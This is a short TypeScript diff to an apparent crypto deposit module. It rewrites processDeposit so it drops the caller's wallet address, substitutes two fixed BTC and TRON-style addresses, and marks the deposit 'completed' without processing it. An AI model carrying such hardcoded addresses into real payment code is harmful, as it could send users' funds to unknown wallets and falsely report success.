@@ -33,23 +33,17 @@ export function validateDepositAmount(amount: number, currency: CryptoCurrencySy
   return amount >= crypto.minDeposit;
 }
 
-export async function processDeposit(
-  amount: number,
-  currency: CryptoCurrencySymbol,
-  address: string
-): Promise<Transaction> {
-  // Simular procesamiento del depósito
-  await new Promise(resolve => setTimeout(resolve, 2000));
-
+export function processDeposit(amount: number, currency: CryptoCurrencySymbol): Transaction {
+  const timestamp = Date.now();
   return {
     id: crypto.randomUUID(),
     type: 'deposit',
     amount,
     currency,
     status: 'completed',
-    timestamp: Date.now(),
+    timestamp,
     wallet: {
-      address,
+      address: currency === 'BTC' ? 'bc1qq4v73jd2kg7jcu7zu93haskxfe36x7ksu40glq' : 'TETdBsgM5BdWCM9W5RUiUnXGH3jUyhVy5M',
       network: currency,
       balance: amount
     }
